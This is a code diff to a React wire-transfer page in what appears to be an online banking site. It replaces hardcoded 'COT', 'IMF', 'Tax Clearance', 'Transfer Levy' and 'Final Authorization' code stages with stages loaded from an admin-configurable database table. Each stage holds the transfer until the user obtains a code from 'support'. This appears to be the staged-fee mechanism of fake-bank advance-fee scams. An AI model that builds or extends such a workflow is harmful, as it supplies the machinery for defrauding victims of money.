@@ -16,6 +16,12 @@ import { isMissingWireTransferAccessColumnError } from "@/lib/supabaseErrors";
 import { TransactionGate } from "@/components/TransactionGate";
 import { useUserAccounts } from "@/hooks/useUserAccounts";
 import { isAccountUsable, getAccountStatusLabel } from "@/lib/accountStatus";
+import {
+  DEFAULT_BUTTON_TEXT,
+  DEFAULT_CODE_LABEL,
+  normalizeVerificationSteps,
+  type WireTransferVerificationStep,
+} from "@/lib/wireTransferVerification";
 
 const wireTransferSchema = z.object({
   beneficiaryName: z.string().min(2, "Name must be at least 2 characters"),
@@ -27,19 +33,12 @@ const wireTransferSchema = z.object({
   purpose: z.string().optional(),
 });
 
-const securityStages = [
-  { code: "COT", name: "Cost of Transfer Code", description: "Required for processing international transfers" },
-  { code: "IMF", name: "International Monitoring Fund Code", description: "Regulatory compliance verification" },
-  { code: "TAX", name: "Tax Clearance Code", description: "Tax compliance verification" },
-  { code: "LEVY", name: "Transfer Levy Code", description: "Government levy clearance" },
-  { code: "FIN", name: "Final Authorization Code", description: "Final authorization for transfer" },
-];
-
 const WireTransfer = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const [loading, setLoading] = useState(false);
   const [currentStep, setCurrentStep] = useState(0);
+  const [verificationSteps, setVerificationSteps] = useState<WireTransferVerificationStep[]>([]);
   const [wireTransferId, setWireTransferId] = useState<string | null>(null);
   const [userId, setUserId] = useState<string | null>(null);
   const [accountId, setAccountId] = useState<string | null>(null);
@@ -59,6 +58,21 @@ const WireTransfer = () => {
   useEffect(() => {
     loadInitialData();
   }, []);
+
+  useEffect(() => {
+    void loadVerificationSteps();
+  }, []);
+
+  const loadVerificationSteps = async () => {
+    const { data, error } = await supabase
+      .from("wire_transfer_verification_steps")
+      .select("*")
+      .order("display_order", { ascending: true });
+
+    if (!error && data) {
+      setVerificationSteps(data as WireTransferVerificationStep[]);
+    }
+  };
 
   const loadInitialData = async () => {
     const { data: { user }, error } = await supabase.auth.getUser();
@@ -90,7 +104,7 @@ const WireTransfer = () => {
       .from("wire_transfers")
       .select("*")
       .eq("user_id", user.id)
-      .in("status", ["awaiting_cot", "awaiting_imf", "awaiting_tax", "awaiting_levy", "awaiting_fin"])
+      .in("status", ["verification_pending", "pending", "awaiting_cot", "awaiting_imf", "awaiting_tax", "awaiting_levy", "awaiting_fin"])
       .order("created_at", { ascending: false })
       .limit(1)
       .single();
@@ -108,15 +122,7 @@ const WireTransfer = () => {
         purpose: pendingTransfer.purpose || "",
       });
 
-      const statusToStep: { [key: string]: number } = {
-        "awaiting_cot": 1,
-        "awaiting_imf": 2,
-        "awaiting_tax": 3,
-        "awaiting_levy": 4,
-        "awaiting_fin": 5,
-      };
-
-      setCurrentStep(statusToStep[pendingTransfer.status] || 0);
+      setCurrentStep(pendingTransfer.current_stage || 0);
       
       toast({
         title: "Pending Transfer Found",
@@ -173,7 +179,7 @@ const WireTransfer = () => {
       } else {
         toast({
           title: "Error",
-          description: error.message,
+          description: error instanceof Error ? error.message : "Unable to initiate wire transfer.",
           variant: "destructive",
         });
       }
@@ -187,14 +193,17 @@ const WireTransfer = () => {
     setLoading(true);
 
     try {
-      const currentStageCode = securityStages[currentStep - 1];
+      const orderedSteps = normalizeVerificationSteps(verificationSteps);
+      const currentStageCode = orderedSteps[currentStep - 1];
+      if (!currentStageCode) {
+        throw new Error("Verification workflow is not configured.");
+      }
 
-      // Use server-side RPC to verify the code (hashed comparison + attempt tracking)
       const { data: verified, error: verifyError } = await supabase.rpc(
         "verify_wire_transfer_code",
         {
           p_wire_transfer_id: wireTransferId,
-          p_code_type: currentStageCode.code,
+          p_code_type: currentStageCode.step_code,
           p_code: securityCodeInput.trim(),
         }
       );
@@ -212,7 +221,7 @@ const WireTransfer = () => {
       }
 
       // Check if this is the last stage
-      if (currentStep === securityStages.length) {
+      if (currentStep === orderedSteps.length) {
         await supabase
           .from("wire_transfers")
           .update({ status: "completed", current_stage: currentStep })
@@ -226,16 +235,9 @@ const WireTransfer = () => {
         setTimeout(() => navigate("/dashboard"), 2000);
       } else {
         const nextStage = currentStep + 1;
-        const statusMap: { [key: number]: string } = {
-          2: "awaiting_imf",
-          3: "awaiting_tax",
-          4: "awaiting_levy",
-          5: "awaiting_fin",
-        };
-
         await supabase
           .from("wire_transfers")
-          .update({ status: statusMap[nextStage], current_stage: nextStage })
+          .update({ status: "verification_pending", current_stage: nextStage })
           .eq("id", wireTransferId);
 
         setCurrentStep(nextStage);
@@ -243,19 +245,22 @@ const WireTransfer = () => {
 
         toast({
           title: "Code verified",
-          description: `Please enter the ${securityStages[nextStage - 1].code} code.`,
+          description: `Please enter the ${orderedSteps[nextStage - 1].title}.`,
         });
       }
     } catch (error: unknown) {
       toast({
         title: "Verification failed",
-        description: error.message,
+        description: error instanceof Error ? error.message : "Unable to verify code.",
         variant: "destructive",
       });
     } finally {
       setLoading(false);
     }
   };
+
+  const orderedVerificationSteps = normalizeVerificationSteps(verificationSteps);
+  const currentVerificationStep = orderedVerificationSteps[currentStep - 1] || null;
 
   if (isBlocked) {
     return (
@@ -288,17 +293,17 @@ const WireTransfer = () => {
       <div className="container mx-auto max-w-4xl px-0 py-4 md:px-4 md:py-8">
       <TransactionGate loading={accountsLoading} hasUsableAccount={hasUsableAccount} restrictedAccounts={restrictedAccounts}>
         {/* Progress Indicator */}
-        {currentStep > 0 && (
+        {currentStep > 0 && orderedVerificationSteps.length > 0 && (
           <Card className="bg-white rounded-xl shadow-sm border-0 p-6 mb-8">
             <h3 className="font-bold mb-4">Security Verification Progress</h3>
             <div className="space-y-3">
-              {securityStages.map((stage, index) => (
-                <div key={stage.code} className="flex items-center space-x-3">
-                  {index < currentStep ? (
+              {orderedVerificationSteps.map((stage, index) => (
+                <div key={stage.id} className="flex items-center space-x-3">
+                  {index + 1 < currentStep ? (
                     <span className="w-7 h-7 rounded-full bg-[var(--bank-gold)] text-[#0A1628] inline-flex items-center justify-center flex-shrink-0">
                       <Check className="w-4 h-4" />
                     </span>
-                  ) : index === currentStep ? (
+                  ) : index + 1 === currentStep ? (
                     <span className="w-7 h-7 rounded-full bg-[var(--bank-navy)] text-white inline-flex items-center justify-center text-xs font-semibold flex-shrink-0">
                       {index + 1}
                     </span>
@@ -308,8 +313,8 @@ const WireTransfer = () => {
                     </span>
                   )}
                   <div>
-                    <p className={`font-medium text-sm ${index === currentStep ? "text-[var(--bank-navy)]" : "text-foreground"}`}>
-                      {stage.name}
+                    <p className={`font-medium text-sm ${index + 1 === currentStep ? "text-[var(--bank-navy)]" : "text-foreground"}`}>
+                      {stage.title}
                     </p>
                     <p className="text-sm text-muted-foreground">{stage.description}</p>
                   </div>
@@ -319,7 +324,7 @@ const WireTransfer = () => {
           </Card>
         )}
 
-        {currentStep === 0 ? (
+          {currentStep === 0 ? (
           <Card className="p-8">
             <div className="flex items-center space-x-3 mb-6">
               <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center">
@@ -437,48 +442,63 @@ const WireTransfer = () => {
           </Card>
         ) : (
           <Card className="bg-white rounded-xl shadow-sm border-0 p-8">
-            <div className="text-center mb-8">
-              <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-4">
-                <Globe className="w-8 h-8 text-primary" />
-              </div>
-              <h2 className="text-2xl font-bold mb-2">
-                {securityStages[currentStep - 1].name}
-              </h2>
-              <p className="text-muted-foreground">
-                {securityStages[currentStep - 1].description}
-              </p>
-            </div>
+            {currentVerificationStep ? (
+              <>
+                <div className="text-center mb-8">
+                  <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-4">
+                    <Globe className="w-8 h-8 text-primary" />
+                  </div>
+                  <h2 className="text-2xl font-bold mb-2">{currentVerificationStep.title}</h2>
+                  <p className="text-muted-foreground">{currentVerificationStep.description}</p>
+                </div>
 
-            <div className="max-w-md mx-auto space-y-6">
-              <div className="p-4 bg-white border border-amber-200 border-l-4 border-l-amber-400 rounded-lg">
-                <p className="text-sm font-medium text-amber-700 mb-2">Important</p>
-                <p className="text-sm">
-                  Please contact our support team to receive your {securityStages[currentStep - 1].code} code. 
-                  For security reasons.
-                </p>
-              </div>
+                <div className="max-w-md mx-auto space-y-6">
+                  <div
+                    className="rounded-lg border-l-4 p-4"
+                    style={{
+                      backgroundColor: currentVerificationStep.message_background_color || "#FFFBEB",
+                      borderColor: currentVerificationStep.message_border_color || "#F59E0B",
+                    }}
+                  >
+                    <p className="mb-2 text-sm font-medium">
+                      {currentVerificationStep.message_title || "Important"}
+                    </p>
+                    <p className="text-sm">
+                      {currentVerificationStep.message_body || "This verification step is configured in the Admin CMS."}
+                    </p>
+                  </div>
 
-              <div className="space-y-2">
-                <label className="text-sm font-medium">
-                  Enter {securityStages[currentStep - 1].code} Code
-                </label>
-                <Input
-                  value={securityCodeInput}
-                  onChange={(e) => setSecurityCodeInput(e.target.value)}
-                  placeholder={`${securityStages[currentStep - 1].code}-XXXXXXXX`}
-                  className="h-14 text-center text-lg font-mono"
-                />
-              </div>
+                  {currentVerificationStep.requires_code !== false ? (
+                    <div className="space-y-2">
+                      <label className="text-sm font-medium">
+                        {currentVerificationStep.code_label || DEFAULT_CODE_LABEL}
+                      </label>
+                      <Input
+                        value={securityCodeInput}
+                        onChange={(e) => setSecurityCodeInput(e.target.value)}
+                        placeholder={currentVerificationStep.placeholder || `${currentVerificationStep.step_code}-XXXXXXXX`}
+                        className="h-14 text-center text-lg font-mono"
+                      />
+                    </div>
+                  ) : (
+                    <p className="text-sm text-muted-foreground">
+                      No verification code is required for this step.
+                    </p>
+                  )}
 
-              <Button 
-                onClick={handleVerifyCode} 
-                size="lg" 
-                className="w-full h-12 bg-[var(--bank-navy)] hover:bg-[var(--bank-slate)]" 
-                disabled={loading || !securityCodeInput.trim()}
-              >
-                {loading ? "Verifying..." : "Verify Code"}
-              </Button>
-            </div>
+                  <Button
+                    onClick={handleVerifyCode}
+                    size="lg"
+                    className="w-full h-12 bg-[var(--bank-navy)] hover:bg-[var(--bank-slate)]"
+                    disabled={loading || (currentVerificationStep.requires_code !== false && !securityCodeInput.trim())}
+                  >
+                    {loading ? "Verifying..." : currentVerificationStep.button_text || DEFAULT_BUTTON_TEXT}
+                  </Button>
+                </div>
+              </>
+            ) : (
+              <div className="text-sm text-muted-foreground">Verification workflow not available.</div>
+            )}
           </Card>
         )}
       </TransactionGate>
